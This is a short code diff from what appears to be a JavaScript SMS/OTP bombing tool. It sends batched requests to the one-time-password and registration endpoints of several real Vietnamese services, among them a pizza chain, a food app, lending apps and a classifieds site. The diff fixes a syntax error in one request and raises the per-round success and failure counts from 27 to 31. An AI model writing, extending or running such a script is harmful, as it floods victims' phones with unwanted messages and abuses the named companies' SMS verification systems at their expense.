@@ -935,15 +935,15 @@ const payload = {
         axios.post('https://thepizzacompany.vn/customer/ResendOtp', tpcData, { headers: tpcHeaders, cookies: tpcCookies }), 
         axios.post('https://ubofood.com/auth/register', ubofoodData, { headers: ubofoodHeaders, cookies: ubofoodCookies }),
         axios.post('https://api.tiencash.com/v1/verify/sms/send', tiencashData, { headers: tiencashHeaders }),
-        axios.get('https://id.chotot.com/_next/data/FbXG9nuM-6zJwYIP9V0dP/register/otp.json', chototParams { headers: chototHeaders, cookies: chototCookies }),
+        axios.get('https://id.chotot.com/_next/data/FbXG9nuM-6zJwYIP9V0dP/register/otp.json', chototParams, { headers: chototHeaders, cookies: chototCookies }),
         axios.post('https://api.cashbar.tech/h5/LoginMessage_ultimate', cashbarData, { headers: cashbarHeaders }), 
         ])
       .then(() => {
-        successCount += 27;
+        successCount += 31;
         updateMessage();
       })
       .catch(() => {
-        failureCount += 27;
+        failureCount += 31;
         updateMessage();
       });
     };
